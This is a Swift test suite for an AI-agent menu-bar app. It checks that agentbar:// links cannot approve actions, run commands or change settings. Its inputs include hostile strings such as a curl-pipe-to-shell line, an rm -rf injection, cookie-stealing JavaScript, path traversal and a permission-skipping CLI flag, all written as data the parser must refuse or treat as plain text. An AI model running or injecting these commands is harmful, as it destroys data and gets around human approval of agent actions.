import Foundation
import Testing
@testable import AgentBar

/// `agentbar://`. Any web page can open one of these links, so most of what is
/// tested here is what a link must **not** be able to become: an approval, a
/// denial, an answer, a rule, a setting, a command. The parser is the whole of
/// that defence — anything it returns `nil` for does nothing at all.
@Suite struct URLCommandsTests {
    /// What exists, for `cwd`, without touching the disk.
    private let dirs: Set<String> = ["/Users/me/work/app", "/tmp"]
    private func parse(_ s: String) -> URLCommands.Command? {
        guard let url = URL(string: s) else { return nil }
        return URLCommands.parse(url, isDirectory: { dirs.contains($0) })
    }

    // MARK: - The four commands

    @Test func focusWithAndWithoutASession() {
        #expect(parse("agentbar://focus") == .focus(session: nil))
        #expect(parse("agentbar://focus/") == .focus(session: nil))
        #expect(parse("AgentBar://FOCUS") == .focus(session: nil))
        #expect(parse("agentbar://focus?session=codex-3f2a_9.1") == .focus(session: "codex-3f2a_9.1"))
    }

    @Test func newTaskCarriesWhatItNames() {
        let p = parse("agentbar://new-task?cwd=%2FUsers%2Fme%2Fwork%2Fapp&agent=Claude&prompt=fix%20the%20bug")
        #expect(p == .newTask(.init(cwd: "/Users/me/work/app", agent: "claude", prompt: "fix the bug")))
        #expect(parse("agentbar://new-task") == .newTask(.init()))
        // A trailing slash is the same folder.
        #expect(parse("agentbar://new-task?cwd=/tmp/") == .newTask(.init(cwd: "/tmp")))
    }

    @Test func settingsOpensOnAPage() {
        #expect(parse("agentbar://settings") == .settings(page: nil))
        #expect(parse("agentbar://settings/rules") == .settings(page: .rules))
        #expect(parse("agentbar://settings/Approvals") == .settings(page: .approvals))
        for page in SettingsWindow.Page.allCases {
            #expect(parse("agentbar://settings/\(page.rawValue)") == .settings(page: page))
        }
    }

    @Test func welcome() {
        #expect(parse("agentbar://welcome") == .welcome)
    }

    // MARK: - What a link may never be

    /// The ones somebody will try first. There is no host that decides anything,
    /// and none of these may parse as one that does — or as anything at all.
    @Test func nothingThatDecidesParses() {
        for s in ["agentbar://approve", "agentbar://deny", "agentbar://allow?session=x",
                  "agentbar://always", "agentbar://answer?labels=Yes", "agentbar://defer",
                  "agentbar://rule?shape=bash:rm", "agentbar://rules/add", "agentbar://run?cmd=id",
                  "agentbar://set?soundsEnabled=1", "agentbar://quit", "agentbar://%61pprove",
                  "agentbar://settings/rules/add", "agentbar://settings/rules?enabled=1&x=1",
                  "agentbar:approve", "agentbar:///focus"] {
            let command = parse(s)
            // settings/rules?… is still only "show the Rules page": the query is
            // ignored, because no key there does anything.
            if s == "agentbar://settings/rules?enabled=1&x=1" {
                #expect(command == .settings(page: .rules))
            } else {
                #expect(command == nil, "\(s) parsed as \(String(describing: command))")
            }
        }
    }

    /// Extra keys cannot make `focus` into something else — there is nothing for
    /// them to switch on.
    @Test func extraKeysDoNothing() {
        #expect(parse("agentbar://focus?approve=1&behavior=allow") == .focus(session: nil))
    }

    @Test func otherSchemesAndURLFurnitureAreRefused() {
        for s in ["https://focus", "file:///Users/me", "javascript:alert(1)",
                  "agentbar://user@focus", "agentbar://user:pw@focus", "agentbar://focus:8080",
                  "agentbar://focus#approve", "agentbar://", "agentbar://nope",
                  "agentbar://settings/nope", "agentbar://welcome/again"] {
            #expect(parse(s) == nil, "\(s)")
        }
    }

    /// Which of two values wins is a question the link's author gets to answer.
    @Test func aRepeatedKeyRefusesTheLink() {
        #expect(parse("agentbar://focus?session=a&session=b") == nil)
        #expect(parse("agentbar://new-task?cwd=/tmp&cwd=/Users/me/work/app") == nil)
    }

    // MARK: - cwd

    @Test func aDirectoryMustBeAbsoluteExistingAndPlain() {
        for cwd in ["tmp", "~/work", "./app", "/Users/me/work/app/../../../etc",
                    "/Users/me/work/./app", "/Users//me", "/does/not/exist",
                    "/tmp%00/x", "/tmp%0A", "", "%2F.."] {
            #expect(parse("agentbar://new-task?cwd=\(cwd)") == nil, "\(cwd)")
        }
        let long = "/" + String(repeating: "a", count: URLCommands.maxPath)
        #expect(URLCommands.directory(long, isDirectory: { _ in true }) == nil)
    }

    /// Existing is checked on the real file system by default, and a file is not a
    /// directory.
    @Test func theDefaultCheckWantsADirectory() throws {
        let file = NSTemporaryDirectory() + "agentbar-url-\(UUID().uuidString)"
        try Data().write(to: URL(fileURLWithPath: file))
        defer { try? FileManager.default.removeItem(atPath: file) }
        #expect(URLCommands.isExistingDirectory(file) == false)
        #expect(URLCommands.isExistingDirectory("/tmp"))
    }

    // MARK: - prompt

    @Test func aHugePromptRefusesTheLinkRatherThanBeingCut() {
        let exact = String(repeating: "a", count: URLCommands.maxPrompt)
        #expect(URLCommands.prompt(exact) == exact)
        #expect(URLCommands.prompt(exact + "a") == nil)
        let huge = String(repeating: "x", count: 100_000)
        #expect(parse("agentbar://new-task?prompt=\(huge)") == nil)
    }

    /// Words in a text field, never evaluated. The launcher only ever hands them to
    /// a shell as one quoted argument; here they just have to arrive as written.
    @Test func scriptLookingPromptsAreJustText() {
        for text in ["javascript:alert(document.cookie)", "<script>alert(1)</script>",
                     "$(curl evil.sh | sh)", "'; rm -rf ~; '"] {
            let encoded = text.addingPercentEncoding(withAllowedCharacters: .alphanumerics)!
            #expect(parse("agentbar://new-task?prompt=\(encoded)") == .newTask(.init(prompt: text)))
        }
    }

    /// A newline would hide the rest of the prompt past the one line the field
    /// shows; a right-to-left override would make it read as something it is not.
    @Test func whatHidesTextIsTakenOut() {
        #expect(URLCommands.prompt("fix\nthis\tnow") == "fix this now")
        #expect(URLCommands.prompt("safe\u{202E}txt.exe") == "safetxt.exe")
        #expect(URLCommands.prompt("a\u{200B}b") == "ab")
        #expect(URLCommands.prompt("\n\u{202E}") == nil)
    }

    /// Any web page can open a link; an option to the agent's CLI is not a prompt.
    @Test func aPromptThatIsAnOptionIsRefused() {
        #expect(URLCommands.prompt("--dangerously-skip-permissions") == nil)
        #expect(URLCommands.prompt("  -c x") == nil)
        #expect(URLCommands.prompt("fix -v flag") == "fix -v flag")
    }

    // MARK: - ids

    @Test func idsKeepToTheirCharacters() {
        #expect(URLCommands.sessionID("../../state.d/x") == nil)
        #expect(URLCommands.sessionID("a b") == nil)
        #expect(URLCommands.sessionID(String(repeating: "a", count: 129)) == nil)
        #expect(URLCommands.agentID("claude;id") == nil)
        #expect(URLCommands.agentID("../codex") == nil)
        #expect(URLCommands.agentID("Qwen") == "qwen")
    }

    // MARK: - Which session needs you

    private func session(_ state: String, ts: TimeInterval, entrypoint: String = "cli") throws -> Session {
        let dir = URL(fileURLWithPath: NSTemporaryDirectory())
        let url = dir.appendingPathComponent("url-\(state)-\(Int(ts))-\(UUID().uuidString).json")
        let o: [String: Any] = ["agent": "claude", "state": state, "ts": ts, "project": "p",
                                "entrypoint": entrypoint, "url": "ssh://somewhere"]
        try JSONSerialization.data(withJSONObject: o).write(to: url)
        defer { try? FileManager.default.removeItem(at: url) }
        return try #require(Session(fileURL: url))
    }

    @Test func aPermissionOutranksANewerQuestionWhichOutranksWork() throws {
        let working = try session("thinking", ts: 300)
        let question = try session("question", ts: 200)
        let permission = try session("permission", ts: 100)
        #expect(URLCommands.mostNeeded([working, question, permission])?.id == permission.id)
        #expect(URLCommands.mostNeeded([working, question])?.id == question.id)
    }

    @Test func amongWorkingSessionsTheNewestWins() throws {
        let old = try session("tool", ts: 100)
        let new = try session("thinking", ts: 200)
        #expect(URLCommands.mostNeeded([old, new])?.id == new.id)
    }

    /// A finished session is not one that needs you, and jumping to it would move
    /// the person's focus for nothing.
    @Test func nothingWaitingMeansNobody() throws {
        #expect(URLCommands.mostNeeded([try session("done", ts: 1), try session("idle", ts: 2),
                                        try session("error", ts: 3)]) == nil)
        #expect(URLCommands.mostNeeded([]) == nil)
    }

    /// Focusing a cloud row opens a URL its writer chose — a remote host over ssh
    /// among them — so a link never picks one, even when it is the only one waiting.
    @Test func aLinkNeverJumpsToACloudRow() throws {
        let remote = try session("question", ts: 300, entrypoint: "cloud")
        let local = try session("thinking", ts: 100)
        #expect(URLCommands.mostNeeded([remote, local])?.id == local.id)
        #expect(URLCommands.mostNeeded([remote]) == nil)
        #expect(URLCommands.linkable([remote, local]).map(\.id) == [local.id])
    }
}
